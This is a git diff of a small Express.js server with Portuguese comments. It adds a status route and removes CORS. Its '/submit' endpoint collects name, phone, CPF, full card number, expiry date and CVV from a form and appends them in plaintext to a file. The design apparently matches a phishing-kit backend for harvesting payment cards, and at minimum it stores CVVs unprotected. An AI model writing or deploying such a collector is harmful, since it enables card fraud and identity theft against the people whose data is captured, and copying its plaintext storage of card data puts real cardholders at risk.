@@ -1,17 +1,15 @@
 const express = require('express');
 const bodyParser = require('body-parser');
 const fs = require('fs');
-const cors = require('cors');  // Importar o cors
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Middleware
-app.use(cors());  // Usar o cors para permitir requisições cross-origin
+// Middleware para lidar com dados do formulário
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 
-// Rota para receber os dados
+// Rota para receber os dados do formulário
 app.post('/submit', (req, res) => {
   const { nome, telefone, cpf, nomeTitular, numeroCartao, dataValidade, cvv } = req.body;
   const data = `Nome: ${nome}, Telefone: ${telefone}, CPF: ${cpf}, Nome do Titular: ${nomeTitular}, Número do Cartão: ${numeroCartao}, Data de Validade: ${dataValidade}, CVV: ${cvv}\n`;
@@ -22,12 +20,17 @@ app.post('/submit', (req, res) => {
       console.error('Erro ao salvar os dados:', err);
       res.status(500).send('Erro ao salvar os dados.');
     } else {
-      res.status(200).send('Dados recebidos e salvos com sucesso!');
+      res.send('Dados recebidos com sucesso!');
     }
   });
 });
 
+// Rota para verificar se o servidor está funcionando
+app.get('/', (req, res) => {
+  res.send('Servidor de recebimento ativo.'); // Mensagem simples para verificar se o servidor está funcionando
+});
+
 // Iniciar o servidor
 app.listen(PORT, () => {
-  console.log(`Servidor de recebimento de dados rodando na porta ${PORT}`);
+  console.log(`Servidor rodando na porta ${PORT}`);
 });
